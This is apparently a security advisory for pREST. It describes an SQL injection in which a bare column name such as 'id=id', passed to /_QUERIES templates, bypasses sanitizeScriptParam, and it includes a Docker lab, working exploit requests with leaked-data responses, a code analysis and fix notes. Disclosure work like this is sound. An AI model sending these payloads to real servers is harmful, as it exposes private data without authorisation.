### Vulnerability details

**Official website / Product:** https://prestd.com / https://github.com/prest/prest

**Repository:** prest/prest (stars at selection: 4630)

**Vulnerability type:** SQLi (tautology via single-token SQL identifier past `sanitizeScriptParam` in unquoted `_QUERIES` templates)

**Vulnerability versions:** v2.5.3 (lab); source tip `6919f254fd6c929ad1751de68e6d185b85932a53` — `sanitizeScriptParam` single-token bypass still present on current main

**Vulnerability URL / Parameter:** `GET /_QUERIES/{location}/{script}` — query parameter interpolated unquoted, e.g. `id` in `WHERE id = {{.id}}`

**Complex:** yes

### Verification procedure

1. Bring up the reproducible lab (original `labs/prest-r10a1` was removed for hygiene; the following matches the Docker-verified run). Host port **19001** → container `3000`. Stack is `postgres:16-alpine` plus a scratch image running a locally built prestd **v2.5.3** with `GOAMD64=v1` (the official `prest/prest:v2.5.3` binary needs a higher CPU ISA than this host). Config: `auth.enabled=false`, `queries.restrict=false`, `access.restrict=false` (product default public mode — **no credentials**). Audited commit: `6919f254fd6c929ad1751de68e6d185b85932a53` / tag **v2.5.3**.

Layout:

```bash
mkdir -p labs/prest-r10a1/{queries/app,db}
cd labs/prest-r10a1
```

`db/init.sql` (seed users including `secret`):

```sql
CREATE TABLE users (
  id SERIAL PRIMARY KEY,
  email TEXT NOT NULL,
  secret TEXT NOT NULL,
  username TEXT NOT NULL
);
INSERT INTO users (email, secret, username) VALUES
  ('alice@example.com', 'top-secret-a', 'alice'),
  ('bob@example.com', 'top-secret-b', 'bob');
```

`queries/app/by_id.read.sql` / `queries/app/login_check.read.sql` are in step 2.

`prest.toml`:

```toml
[http]
port = 3000

[auth]
enabled = false

[jwt]
default = false

[access]
restrict = false

[queries]
location = "/queries"
restrict = false

[pg]
host = "postgres"
port = 5432
user = "postgres"
pass = "postgres"
database = "prest"
sslmode = "disable"
```

`Dockerfile` (scratch + `GOAMD64=v1` self-built binary; entrypoint `/prestd`):

```dockerfile
FROM golang:1.26-bookworm AS build
WORKDIR /src
RUN git clone --depth 1 --branch v2.5.3 https://github.com/prest/prest.git .
# tip align: git fetch --depth 1 origin 6919f254fd6c929ad1751de68e6d185b85932a53 && git checkout 6919f254fd6c929ad1751de68e6d185b85932a53
ENV CGO_ENABLED=0 GOOS=linux GOAMD64=v1
RUN go build -trimpath -ldflags="-s -w" -o /prestd ./cmd/prestd

FROM scratch
COPY --from=build /prestd /prestd
COPY prest.toml /prest.toml
ENTRYPOINT ["/prestd"]
```

`docker-compose.yml`:

```yaml
services:
  postgres:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: prest
      POSTGRES_USER: postgres
      POSTGRES_PASSWORD: postgres
    volumes:
      - ./db/init.sql:/docker-entrypoint-initdb.d/init.sql:ro
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -d prest -U postgres"]
      interval: 5s
      timeout: 5s
      retries: 20
  prest:
    build: .
    depends_on:
      postgres:
        condition: service_healthy
    ports:
      - "19001:3000"
    environment:
      PREST_CONF: /prest.toml
      PREST_DEBUG: "true"
      PREST_AUTH_ENABLED: "false"
      PREST_ACCESS_RESTRICT: "false"
      PREST_JWT_DEFAULT: "false"
      PREST_CACHE_ENABLED: "false"
      PREST_QUERIES_LOCATION: /queries
      PREST_PG_HOST: postgres
      PREST_PG_PORT: "5432"
      PREST_PG_USER: postgres
      PREST_PG_PASS: postgres
      PREST_PG_DATABASE: prest
      PREST_PG_SSLMODE: disable
    volumes:
      - ./queries:/queries:ro
```

Bring-up and expected process list:

```bash
docker compose up -d --build
docker compose ps
```

```
NAME                     IMAGE                COMMAND                  SERVICE    STATUS                   PORTS
prest-r10a1-postgres-1   postgres:16-alpine   "docker-entrypoint.s…"   postgres   Up (healthy)             5432/tcp
prest-r10a1-prest-1      prest-r10a1-prest    "/prestd"                prest      Up                       0.0.0.0:19001->3000/tcp
```

2. Lab scripts (same unquoted-interpolation idiom as upstream `testdata/queries/fulltable/get_unquoted.read.sql`):

```sql
-- queries/app/by_id.read.sql
SELECT id, email, secret, username FROM users WHERE id = {{.id}}
```

```sql
-- queries/app/login_check.read.sql (optional second case)
SELECT id, username FROM users WHERE username = {{.username}} AND secret = {{.secret}}
```

3. Control: `GET /_QUERIES/app/by_id?id=1` returns only Alice.
4. Exploit: `GET /_QUERIES/app/by_id?id=id` returns **all** users including `secret` columns (tautology `WHERE id = id`).
5. Optional: `GET /_QUERIES/app/login_check?username=username&secret=secret` returns every user (`WHERE username = username AND secret = secret`).

### Complete vulnerability PoC

Control request (normal primary-key filter):

```http
GET /_QUERIES/app/by_id?id=1 HTTP/1.1
Host: 127.0.0.1:19001
User-Agent: prest-r10a1-poc
Accept: application/json
Connection: close

```

Control response:

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id": 1, "email": "alice@example.com", "secret": "top-secret-a", "username": "alice"}]
```

Complete exploit HTTP request (Docker-verified):

```http
GET /_QUERIES/app/by_id?id=id HTTP/1.1
Host: 127.0.0.1:19001
User-Agent: prest-r10a1-poc
Accept: application/json
Connection: close

```

Complete HTTP response (raw Docker-lab response):

```http
HTTP/1.1 200 OK
Content-Type: application/json
Vary: Origin
Date: Sun, 01 Nov 2026 13:26:05 GMT
Content-Length: 172
Connection: close

[{"id": 1, "email": "alice@example.com", "secret": "top-secret-a", "username": "alice"}, {"id": 2, "email": "bob@example.com", "secret": "top-secret-b", "username": "bob"}]
```

Optional second case (login_check dual-column tautology):

```http
GET /_QUERIES/app/login_check?username=username&secret=secret HTTP/1.1
Host: 127.0.0.1:19001
User-Agent: prest-r10a1-poc
Accept: application/json
Connection: close

```

```http
HTTP/1.1 200 OK
Content-Type: application/json

[{"id": 1, "username": "alice"}, {"id": 2, "username": "bob"}]
```

Verification result notes:

Control `id=1` returned a single row. Exploit `id=id` returned both Alice and Bob with `secret` values `top-secret-a` / `top-secret-b`, proving the filter was replaced by a tautology. `login_check` likewise discloses every username. Measured impact summary:

```
CONTROL id=1:
[{"id": 1, "email": "alice@example.com", "secret": "top-secret-a", "username": "alice"}]
EXPLOIT id=id (tautology):
[{"id": 1, "email": "alice@example.com", "secret": "top-secret-a", "username": "alice"}, {"id": 2, "email": "bob@example.com", "secret": "top-secret-b", "username": "bob"}]
LOGIN tautology username=username&secret=secret:
[{"id": 1, "username": "alice"}, {"id": 2, "username": "bob"}]
```

### Vulnerability analysis

pREST custom SQL scripts (`/_QUERIES`) still support Go `text/template` interpolation of request parameters. Call chain: `ScriptHandler.Execute` → `ExecuteScriptQuery` (`controllers/script.go` ~114–129) calls `extractQueryParameters`, which runs values through `screenedValue` → `sanitizeScriptParam` into `templateData`, then `ParseScriptTemplate` splices them into the SQL text.

Values are gated by `sanitizeScriptParam`, which (1) allow-lists `[a-zA-Z0-9_.:@/\ -]`, (2) rejects `--` / `::`, and (3) runs a SQL-keyword screen **only if the value contains an ASCII space**. Issue #1030 intentionally left single-token values unscreened, documenting them as inert syntax errors. That assumption is wrong: a token that is a legal identifier and names an in-scope column is valid SQL. For the common numeric-filter idiom `WHERE id = {{.id}}`, sending `id=id` yields `WHERE id = id`, which is true for every row and returns the full projection (including secrets). No quotes, spaces, parentheses, or keywords are required, so the post-GHSA-5rwc keyword screen never runs. Default deployments expose `_QUERIES` without auth (`auth.enabled=false`, `queries.restrict=false`).

Trigger / sink source (full path and line numbers):

```go
# File: controllers/script.go
# Lines: 114-129 (ExecuteScriptQuery: extract params → parse template → execute)
func (h *ScriptHandler) ExecuteScriptQuery(rq *http.Request, queriesPath string, script string) ([]byte, error) {
	// ...
	templateData := make(map[string]interface{})
	extractHeaders(rq, templateData)
	rejected := extractQueryParameters(rq, templateData)
	sql, values, err := h.scripts.ParseScriptTemplate(source.Name, source.Content, templateData)
	// ...
}
```

```go
# File: controllers/script.go
# Lines: 294-314 (sanitizeScriptParam: no-space path returns single token unchanged)
func sanitizeScriptParam(value string) string {
	if !safeScriptParamRegex.MatchString(value) {
		return ""
	}
	if strings.Contains(value, "--") || strings.Contains(value, "::") {
		return ""
	}
	if !strings.Contains(value, " ") {
		return value
	}
	for _, word := range scriptParamWordRegex.FindAllString(value, -1) {
		word = strings.ToLower(word)
		if _, ok := scriptParamSQLKeywords[word]; ok {
			return ""
		}
		if _, ok := scriptParamSQLKeywords[scriptParamLeadingDigits.ReplaceAllString(word, "")]; ok {
			return ""
		}
	}
	return value
}
```

Upstream same-idiom test script (`testdata/queries/fulltable/get_unquoted.read.sql`, v2.5.3):

```sql
SELECT * FROM test7 WHERE 1 = {{.field1}}
```

### Fix notes

- Prefer binding: require `{{sqlVal}}` / `{{sqlList}}` for all caller-controlled values; reject templates that interpolate raw `{{.param}}` into SQL.
- Or treat single-token values that are not strict integer/float literals as rejected for unquoted interpolation (allow-list numeric literals only when the template context is unquoted).
- Do not assume "single token ⇒ inert"; column-name tautologies are valid SQL.
